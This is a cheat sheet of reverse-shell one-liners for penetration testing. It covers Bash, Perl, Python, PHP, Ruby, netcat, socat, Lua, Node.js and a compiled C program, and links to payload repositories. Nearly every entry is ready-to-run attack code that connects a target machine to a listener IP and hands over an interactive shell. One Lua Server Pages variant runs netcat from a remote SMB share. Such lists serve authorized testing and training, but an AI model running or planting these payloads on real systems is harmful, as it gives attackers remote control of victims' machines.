# Reverse Shell One-Liners


## Bash

TCP:

```bash
bash -i >& /dev/tcp/10.13.37.10/53 0>&1
```
```bash
bash -c 'bash -i >& /dev/tcp/10.13.37.10/53 0>&1'
```
```bash
0<&196;exec 196<>/dev/tcp/10.13.37.10/4242; sh <&196 >&196 2>&196
```
```bash
/bin/bash -l > /dev/tcp/10.13.37.10/4242 0<&1 2>&1
```

UDP:
```bash
sh -i >& /dev/udp/10.13.37.10/4242 0>&1

Listener:
nc -u -lvp 4242
```

## Perl
```bash
perl -e 'use Socket;$i="10.13.37.10";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.37.10",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.37.10",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP
```bash
php -r '$sock=fsockopen("10.13.37.10",53);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.13.37.10",53).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc (netcat)
```bash
nc -e /bin/sh 10.13.37.10 53
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.37.10 53 >/tmp/f
```

## socat
```bash
# listener
socat file:`tty`,raw,echo=0 TCP-L:4242

# revshell
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

## Lua

```lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.0.0.1',8080);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" 
```

## Lua Server Pages

Either run the command above in `<?lsp ... ?>` or if the socket module is not available try the os module:

* Start your SMB server
* Provide reverse shell binary or nc.exe

```lua
<?lsp
  require('os');
  os.execute("cmd.exe /c \\\\192.0.0.1\\EVILSHARE\\nc64.exe 192.0.0.1 135 -e cmd.exe")
?>
```

## NodeJs
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(5555, "10.0.13.37", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

## PHP
```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## C

```c
# gcc /tmp/shell.c --output cshell
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

## Resources

* [swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [genshell](https://github.com/djjoa/genshell)